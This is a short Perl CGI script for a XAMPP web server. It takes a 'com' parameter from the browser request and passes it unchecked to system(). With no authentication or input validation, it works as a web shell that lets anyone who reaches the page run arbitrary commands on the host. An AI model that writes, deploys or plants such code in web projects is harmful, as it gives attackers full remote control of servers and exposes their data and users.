#!C:/xampp/perl/bin/perl.exe
 use CGI':standard';
 #the following line is used for displaying the output of the script in the browser
 print "Content-type:text/html\n\n";
 #take the input command from the browser and store in the variable
 $c=param('com');
 #process the command
 system($c);
 exit(0);
